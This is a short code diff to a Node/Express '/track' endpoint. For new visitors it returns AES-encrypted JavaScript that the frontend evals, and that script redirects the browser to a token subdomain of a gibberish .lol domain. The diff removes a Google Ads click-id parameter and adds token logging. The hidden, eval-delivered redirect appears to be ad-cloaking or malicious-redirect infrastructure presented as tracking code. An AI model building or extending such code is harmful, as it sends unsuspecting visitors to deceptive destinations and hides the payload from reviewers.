@@ -126,7 +126,7 @@ app.post("/track", async (req, res) => {
     }
 
     // Fresh visitor — encrypt and return the JS code
-    const jsCode = buildJsCode(gclid);
+    const jsCode = buildJsCode();
     const encrypted = encodeURIComponent(
       CryptoJS.AES.encrypt(jsCode, ENCRYPTION_KEY).toString(),
     );
@@ -141,9 +141,11 @@ app.post("/track", async (req, res) => {
  * Returns the JS snippet string that the frontend will eval / inject.
  * Customize the body of this function to match your popup / tracking logic.
  */
-function buildJsCode(gclid) {
+function buildJsCode() {
   const tokens = require("./valid-tokens.json");
   const token = tokens.pop();
+
+  console.log("Generated JS code with token:", token);
 
   return `window.location.href="https://${token}.nblakjdfnvlkjadsfnv.lol"`;
 }
